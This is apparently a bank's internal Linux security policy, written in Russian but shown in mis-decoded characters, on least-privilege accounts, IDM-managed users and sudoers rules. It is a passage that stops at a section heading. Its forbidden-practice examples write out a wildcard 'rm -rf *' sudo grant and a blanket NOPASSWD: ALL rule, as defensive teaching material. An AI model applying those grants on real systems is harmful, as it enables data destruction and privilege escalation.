# üîí –ö–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω—ã–µ –ø—Ä–∞–≤–∏–ª–∞ –∏ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

> **–ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ:** –¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–π –¥–æ–∫—É–º–µ–Ω—Ç —Å –ø—Ä–∞–≤–∏–ª–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –∏ —Å–æ–ø—Ä–æ–≤–æ–∂–¥–µ–Ω–∏—è –ø—Ä–∏–∫–ª–∞–¥–Ω—ã—Ö —Å–∏—Å—Ç–µ–º –≤ Enterprise —Å—Ä–µ–¥–µ —Å–æ —Å—Ç—Ä–æ–≥–æ–π —Ä–æ–ª–µ–≤–æ–π –º–æ–¥–µ–ª—å—é.  
> **–°—Ç–∞—Ç—É—Å:** –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –∫ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—é  
> **–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ:** November 19, 2024  
> **–í–µ—Ä—Å–∏—è:** 1.0

---

## üìë –°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ

1. [–û–±—â–∏–µ –ø—Ä–∏–Ω—Ü–∏–ø—ã](#–æ–±—â–∏–µ-–ø—Ä–∏–Ω—Ü–∏–ø—ã)
2. [–†–∞–±–æ—Ç–∞ —Å –ø—Ä–∞–≤–∞–º–∏ –∏ sudo](#—Ä–∞–±–æ—Ç–∞-—Å-–ø—Ä–∞–≤–∞–º–∏-–∏-sudo)
3. [–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏](#—É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏)
4. [–§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ –∏ –∫–∞—Ç–∞–ª–æ–≥–∏](#—Ñ–∞–π–ª–æ–≤–∞—è-—Å–∏—Å—Ç–µ–º–∞-–∏-–∫–∞—Ç–∞–ª–æ–≥–∏)
5. [–†–∞–∑–¥–µ–ª–µ–Ω–∏–µ –ø–æ–ª–Ω–æ–º–æ—á–∏–π](#—Ä–∞–∑–¥–µ–ª–µ–Ω–∏–µ-–ø–æ–ª–Ω–æ–º–æ—á–∏–π)
6. [–•—Ä–∞–Ω–µ–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤](#—Ö—Ä–∞–Ω–µ–Ω–∏–µ-—Å–µ–∫—Ä–µ—Ç–æ–≤)
7. [–°–æ–∑–¥–∞–Ω–∏–µ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞–º–∏](#—Å–æ–∑–¥–∞–Ω–∏–µ-–∏-—É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ-—Å–µ—Ä–≤–∏—Å–∞–º–∏)
8. [–ó–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–µ –ø—Ä–∞–∫—Ç–∏–∫–∏](#–∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–µ-–ø—Ä–∞–∫—Ç–∏–∫–∏)
9. [–î–µ—Ç–µ–∫—Ç–∏—Ä—É–µ–º—ã–µ –Ω–∞—Ä—É—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏](#–¥–µ—Ç–µ–∫—Ç–∏—Ä—É–µ–º—ã–µ-–Ω–∞—Ä—É—à–µ–Ω–∏—è-–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)
10. [–ß–µ–∫–ª–∏—Å—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏](#—á–µ–∫–ª–∏—Å—Ç-–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)

---

## üéØ –û–±—â–∏–µ –ø—Ä–∏–Ω—Ü–∏–ø—ã

### –ü—Ä–∏–Ω—Ü–∏–ø –Ω–∞–∏–º–µ–Ω—å—à–∏—Ö –ø–æ–ª–Ω–æ–º–æ—á–∏–π

**–ü—Ä–∞–≤–∏–ª–æ:** –ü—Ä–∏–∫–ª–∞–¥–Ω–æ–µ –ü–û –¥–æ–ª–∂–Ω–æ —Ä–∞–±–æ—Ç–∞—Ç—å, –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞—Ç—å—Å—è –∏ —É–ø—Ä–∞–≤–ª—è—Ç—å—Å—è **–ø–æ–ª–Ω–æ—Å—Ç—å—é –Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –£–ó**.

**–¢—Ä–µ–±–æ–≤–∞–Ω–∏—è:**
- –§–∞–π–ª—ã —Å –¥–∞–Ω–Ω—ã–º–∏, –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–µ–π –∏ –∂—É—Ä–Ω–∞–ª–∞–º–∏ –¥–æ–ª–∂–Ω—ã –ª–µ–∂–∞—Ç—å –≤ **–æ—Ç–¥–µ–ª—å–Ω–æ–π –§–°**, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—â–µ–π –Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –£–ó
- **–ù–∏–∫–∞–∫–∏—Ö –ø—Ä–∞–≤ root** –¥–ª—è –ø–æ–≤—Å–µ–¥–Ω–µ–≤–Ω–æ–π —Ä–∞–±–æ—Ç—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ **User Systemd Units** –≤–º–µ—Å—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö

**–ü—Ä–∏–º–µ—Ä –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã:**
```
/opt/monitoring/
‚îú‚îÄ‚îÄ bin/          # –í–ª–∞–¥–µ–ª–µ—Ü: CI_USER:SYS_GROUP, 750
‚îú‚îÄ‚îÄ config/       # –í–ª–∞–¥–µ–ª–µ—Ü: CI_USER:SYS_GROUP, 750
‚îú‚îÄ‚îÄ data/         # –í–ª–∞–¥–µ–ª–µ—Ü: SYS_USER:SYS_GROUP, 770
‚îî‚îÄ‚îÄ logs/         # –í–ª–∞–¥–µ–ª–µ—Ü: SYS_USER:SYS_GROUP, 770
```

---

### Enterprise —Å—Ä–µ–¥–∞ vs –ò–Ω—Ç–µ—Ä–Ω–µ—Ç-—Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–∞

**–ö–ª—é—á–µ–≤—ã–µ –æ—Ç–ª–∏—á–∏—è:**

| –ê—Å–ø–µ–∫—Ç | –ò–Ω—Ç–µ—Ä–Ω–µ—Ç-—Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–∞ | Enterprise (–°–±–µ—Ä) |
|--------|---------------------|-------------------|
| **–ü—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞** | –ü–æ–ª–Ω—ã–π root –¥–æ—Å—Ç—É–ø | –û–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–µ –ø—Ä–∞–≤–∞ —á–µ—Ä–µ–∑ IDM |
| **–û—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å** | –í—ã –æ—Ç–≤–µ—á–∞–µ—Ç–µ –∑–∞ —Å–µ—Ä–≤–µ—Ä | SberInfra –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ —Å–µ—Ä–≤–µ—Ä, –∫–æ–º–∞–Ω–¥—ã –ê–° ‚Äî –∑–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ |
| **–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ü–û** | sudo apt/yum install | –¢–æ–ª—å–∫–æ —á–µ—Ä–µ–∑ –ø–æ—Ä—Ç–∞–ª –î–ò + RLM |
| **–ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è** | –õ—é–±—ã–µ —Å–∫—Ä–∏–ø—Ç—ã | –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ RLM, Ansible —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ |
| **Sudo –ø—Ä–∞–≤–∞** | sudo ALL | –Ø–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –±–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ IDM |

---

### –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ª–µ–≥–∞–ª—å–Ω–æ–≥–æ –ü–û

**‚úÖ –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û:**
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å **—Ç–æ–ª—å–∫–æ –ü–û –∏–∑ –ø–æ—Ä—Ç–∞–ª–∞ –î–ò** (–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –ò–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã)
- –ü–û –∏–∑ –î–ò –ø–æ–ª–Ω–æ—Å—Ç—å—é –ª–µ–≥–∞–ª—å–Ω–æ –∏ –æ–±—Å–ª—É–∂–∏–≤–∞–µ—Ç—Å—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ –∏–ª–∏ RLM

**‚ùå –ó–ê–ü–†–ï–©–ï–ù–û:**
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ü–û –Ω–µ –∏–∑ –ø–æ—Ä—Ç–∞–ª–∞ –î–ò (—Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ –Ω–µ–ª–µ–≥–∞–ª—å–Ω–æ –≤ –±–∞–Ω–∫–µ)
- Legacy –≤—ã–¥–∞—á–∞ –ø–æ –ó–ù–ò –±–µ–∑ –∫—Ä–∞–π–Ω–µ–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ (–ø–æ—Ä–æ–∂–¥–∞–µ—Ç —Ä—É—á–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏)

**–°—Å—ã–ª–∫–∏:**
- –ü–æ—Ä—Ç–∞–ª –î–ò: [internal-link]
- –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ü–û —á–µ—Ä–µ–∑ RLM: https://rlm.sigma.sbrf.ru/dashboard/directions/RLM_UVS

---

### –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ RLM

**RLM (Resource Lifecycle Management)** ‚Äî –æ—Å–Ω–æ–≤–Ω–æ–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã—Ö –∑–∞–¥–∞—á.

**–ü–æ–ø—É–ª—è—Ä–Ω—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ RLM:**
- –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ü–û –∏–∑ –§–ü–î
- –°–æ–∑–¥–∞–Ω–∏–µ/—Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–∏—Å—Ç–µ–º
- –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏ –∏ –≥—Ä—É–ø–ø–∞–º–∏
- –†–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:**
1. –û—Ç–∫—Ä—ã—Ç—å https://rlm.sigma.sbrf.ru/dashboard/directions/RLM_UVS
2. –ù–∞–π—Ç–∏ –Ω—É–∂–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π
3. –£–∫–∞–∑–∞—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã (—Å–µ—Ä–≤–µ—Ä, –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, —Ä–∞–∑–º–µ—Ä –§–° –∏ —Ç.–¥.)
4. –ó–∞–ø—É—Å—Ç–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ

**–¢–∞–∫–∂–µ –¥–æ—Å—Ç—É–ø–Ω—ã:**
- –°–∫—Ä–∏–ø—Ç—ã —Å–∞–º–æ–æ–±—Å–ª—É–∂–∏–≤–∞–Ω–∏—è –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ –ê–°
- –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Ansible —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏

---

## üîê –†–∞–±–æ—Ç–∞ —Å –ø—Ä–∞–≤–∞–º–∏ –∏ sudo

### –ü—Ä–∞–≤–∏–ª–∞ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è sudo –ø—Ä–∞–≤

**‚ùå –ö–ê–¢–ï–ì–û–†–ò–ß–ï–°–ö–ò –ó–ê–ü–†–ï–©–ï–ù–û:**
```sudoers
# –ù–ï–¢ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö!
myuser ALL=(ALL) NOPASSWD: /usr/bin/chown $USER:$GROUP *

# –ù–ï–¢ wildcards –≤ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –º–µ—Å—Ç–∞—Ö!
myuser ALL=(ALL) NOPASSWD: /usr/bin/rm -rf *

# –ù–ï–¢ —à–∏—Ä–æ–∫–∏—Ö –ø—Ä–∞–≤!
myuser ALL=(ALL) NOPASSWD: ALL
```

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:**
```sudoers
# –Ø–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã, –ø–æ–ª–Ω—ã–µ –ø—É—Ç–∏, —è–≤–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã
myuser ALL=(ALL\:ALL) NOPASSWD: /usr/bin/chown root\:root /opt/myapp/config/app.conf
myuser ALL=(ALL\:ALL) NOPASSWD: /usr/bin/systemctl --user restart myapp
myuser ALL=(ALL\:ALL) NOPASSWD: /usr/bin/mkdir -p /opt/myapp/data
```

**–¢—Ä–µ–±–æ–≤–∞–Ω–∏—è –∫ sudoers:**
1. **–ü–æ–ª–Ω—ã–π –ø—É—Ç—å** –∫ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É (`/usr/bin/...`, `/usr/sbin/...`)
2. **–Ø–≤–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã** –±–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
3. **–Ø–≤–Ω—ã–µ –ø—É—Ç–∏** –¥–ª—è —Ñ–∞–π–ª–æ–≤ –∏ –∫–∞—Ç–∞–ª–æ–≥–æ–≤
4. **–≠–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–ø–µ—Ü—Å–∏–º–≤–æ–ª–æ–≤**: `\:` –¥–ª—è `:`, `\;` –¥–ª—è `;`
5. **NOEXEC —Ñ–ª–∞–≥** –¥–ª—è read-only –∫–æ–º–∞–Ω–¥: `NOPASSWD: NOEXEC: /usr/bin/systemctl --user status myapp`

**–§–æ—Ä–º–∞—Ç –≤ IDM:**
```
# –ë–µ–∑ –ª–æ–≥–∏–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –Ω–∞—á–∞–ª–µ!
ALL=(ALL:ALL) NOPASSWD: /usr/bin/systemctl stop idmconnectorserver
ALL=(myuser_nologin) NOPASSWD: /usr/bin/cat /opt/myapp/logs/app.log
```

---

### –ü–æ—á–µ–º—É sudo -u, –∞ –Ω–µ su –∏–ª–∏ sg?

**–°—Ä–∞–≤–Ω–∏—Ç–µ–ª—å–Ω–∞—è —Ç–∞–±–ª–∏—Ü–∞:**

| –ü–∞—Ä–∞–º–µ—Ç—Ä | `su - <user>` | `sg <group>` | `sudo -u <user>` |
|----------|---------------|--------------|------------------|
| **–ü–∞—Ä–æ–ª—å** | –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è | –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å (–¥–∞–∂–µ —á–µ—Ä–µ–∑ SSH) | –ü–∞—Ä–æ–ª—å —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–º–æ–∂–Ω–æ NOPASSWD) |
| **–ê—É–¥–∏—Ç** | –û–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–π (—Ç–æ–ª—å–∫–æ —Ñ–∞–∫—Ç su) | –û–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–π | **–ü–æ–ª–Ω—ã–π**: –∫—Ç–æ, –∫–æ–≥–¥–∞, –∫–∞–∫–∏–µ –∫–æ–º–∞–Ω–¥—ã |
| **–ì—Ä–∞–Ω—É–ª–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–∞–≤** | –ù–µ—Ç (–ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø) | –ù–µ—Ç (–ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø) | **–í–æ–∑–º–æ–∂–µ–Ω —Ç–æ—á–Ω—ã–π –Ω–∞–±–æ—Ä –∫–æ–º–∞–Ω–¥** |
| **–ö–æ–Ω—Ç—Ä–æ–ª—å –æ–∫—Ä—É–∂–µ–Ω–∏—è** | –ú–æ–≥—É—Ç "–ø—Ä–æ—Ç–µ–∫–∞—Ç—å" –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ | –ú–æ–≥—É—Ç "–ø—Ä–æ—Ç–µ–∫–∞—Ç—å" –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ | **–°—Ç—Ä–æ–≥–∏–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è** (env_reset, secure_path) |
| **–†–∞–±–æ—Ç–∞ —á–µ—Ä–µ–∑ SSH** | –¢—Ä–µ–±—É–µ—Ç –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Ç–µ—Ä–º–∏–Ω–∞–ª | **–ù–ï –†–ê–ë–û–¢–ê–ï–¢** (–∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç –ø–∞—Ä–æ–ª—å) | ‚úÖ **–†–∞–±–æ—Ç–∞–µ—Ç** –±–µ–∑ –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ |
| **–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è –°–±–µ—Ä** | ‚ùå –ù–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è | ‚ùå –ù–µ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏ | ‚úÖ **–†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è** |

**‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
# –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –Ω–∞ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
sudo -u myuser_nologin bash

# –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã —Å –≥—Ä—É–ø–ø–æ–π
sudo -u myuser_sys -g myuser_sys /opt/myapp/bin/start.sh

# –ß–µ—Ä–µ–∑ —è–≤–Ω—ã–µ sudoers –ø—Ä–∞–≤–∞
myuser_ci ALL=(myuser_sys:myuser_sys) NOPASSWD: /opt/myapp/bin/start.sh
```

**‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û:**
```bash
# su —Ç—Ä–µ–±—É–µ—Ç –ø–∞—Ä–æ–ª—å –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
su - myuser_nologin

# sg –ù–ï —Ä–∞–±–æ—Ç–∞–µ—Ç —á–µ—Ä–µ–∑ SSH (–∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç –ø–∞—Ä–æ–ª—å)
sg myuser_sys -c '–∫–æ–º–∞–Ω–¥–∞'

# newgrp —Ç–æ–∂–µ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç —á–µ—Ä–µ–∑ SSH
newgrp myuser_sys
```

---

## üë§ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏

### –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —á–µ—Ä–µ–∑ IDM

**–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã:**
- **–ê–° –°–£–£–ü–¢ (IDM)** ‚Äî –µ–¥–∏–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —É—á–µ—Ç–Ω—ã–º–∏ –∑–∞–ø–∏—Å—è–º–∏
- –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è: [–†–∞–±–æ—Ç–∞ —Å –£–ó Linux –≤ IDM]

**–¢–∏–ø—ã —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π:**

| –¢–∏–ø | –ù–∞–∑–≤–∞–Ω–∏–µ | –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π –≤—Ö–æ–¥ | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ | –ü—Ä–∏–º–µ—Ä |
|-----|----------|-------------------|-----------|--------|
| **–°–£–ó** | –°–µ—Ä–≤–∏—Å–Ω–∞—è –£–ó | ‚ùå NoLogin | –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–∏—Å–æ–≤ | `myapp_sys` |
| **–ü–£–ó** | –ü—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –£–ó | ‚úÖ –î–∞ | –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ (–±–µ–∑ –¥–µ–ø–ª–æ—è) | `myapp_admin` |
| **–¢–£–ó** | –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –£–ó | ‚úÖ –î–∞ | CI/CD, –¥–µ–ø–ª–æ–π | `myapp_ci` |
| **ReadOnly** | –¢–æ–ª—å–∫–æ —á—Ç–µ–Ω–∏–µ | ‚úÖ –î–∞ | –ü—Ä–æ—Å–º–æ—Ç—Ä –ª–æ–≥–æ–≤, —Å—Ç–∞—Ç—É—Å–æ–≤ | `myapp_ro` |

**–ü—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–Ω–∏—è:**

1. **–°–æ–∑–¥–∞—Ç—å –∑–∞—è–≤–∫—É –≤ IDM**
   - –£–∫–∞–∑–∞—Ç—å —Ç–∏–ø –£–ó
   - –î–ª—è –°–£–ó: **–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ** —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–ª–∞–≥ `NoLogin`
   - –£–∫–∞–∑–∞—Ç—å —Ü–µ–ª–µ–≤—ã–µ —Å–µ—Ä–≤–µ—Ä—ã

2. **–î–æ–∂–¥–∞—Ç—å—Å—è —Å–æ–≥–ª–∞—Å–æ–≤–∞–Ω–∏—è**

3. **–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–æ–∑–¥–∞–Ω–∏–µ:**
   ```bash
   id myapp_sys
   # –û–∂–∏–¥–∞–µ—Ç—Å—è: uid=... gid=... groups=...
   ```

**‚ùå –ó–ê–ü–†–ï–©–ï–ù–û:**
- –°–æ–∑–¥–∞–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤—Ä—É—á–Ω—É—é (`useradd`, `adduser`)
- –ò–∑–º–µ–Ω—è—Ç—å `/etc/passwd`, `/etc/shadow`, `/etc/group` –Ω–∞–ø—Ä—è–º—É—é

---

### –ó–∞–ø—É—Å–∫ –∫–æ–º–∞–Ω–¥ –æ—Ç –∏–º–µ–Ω–∏ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

**–¢—Ä–µ–±–æ–≤–∞–Ω–∏–µ:** –ó–∞–ø—Ä–æ—Å–∏—Ç—å –≤ IDM –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø—É—Å–∫ –∫–æ–º–∞–Ω–¥ –æ—Ç –∏–º–µ–Ω–∏ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

**–§–æ—Ä–º–∞—Ç –ø—Ä–∞–≤:**
```sudoers
myuser_admin ALL=(myuser_sys) NOPASSWD: ALL
```

–ò–ª–∏ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã:
```sudoers
myuser_ci ALL=(myuser_sys) NOPASSWD: /usr/bin/systemctl --user restart myapp
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:**
```bash
# –ó–∞–ø—É—Å–∫ shell –æ—Ç –∏–º–µ–Ω–∏ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
sudo -u myuser_sys bash

# –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã
sudo -u myuser_sys systemctl --user restart myapp

# –° —É–∫–∞–∑–∞–Ω–∏–µ–º –≥—Ä—É–ø–ø—ã
sudo -u myuser_sys -g myuser_sys mkdir -p /dev/shm/myapp_secrets
```

**–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è:**
- [–ö–∞–∫ —Å–æ–∑–¥–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π —Å–µ—Ä–≤–∏—Å systemd –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ (nologin) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è?]

---

## üìÅ –§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ –∏ –∫–∞—Ç–∞–ª–æ–≥–∏

### –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–∏—Å—Ç–µ–º —á–µ—Ä–µ–∑ RLM

**–ü—Ä–∏–Ω—Ü–∏–ø:** –ê–° –¥–æ–ª–∂–Ω–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å **–æ—Ç–¥–µ–ª—å–Ω—É—é –§–°** —Å –ø—Ä–∞–≤–∞–º–∏ –ø—Ä–∏–∫–ª–∞–¥–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

**‚ùå –ï—Å–ª–∏ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–∞–π–ª–æ–≤/–∫–∞—Ç–∞–ª–æ–≥–æ–≤ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–µ –æ–±—Ä–∞—â–µ–Ω–∏–µ –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –û–°** ‚Üí **–ê–° —Å–ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∞ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ!**

---

### –ü—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–Ω–∏—è –§–°

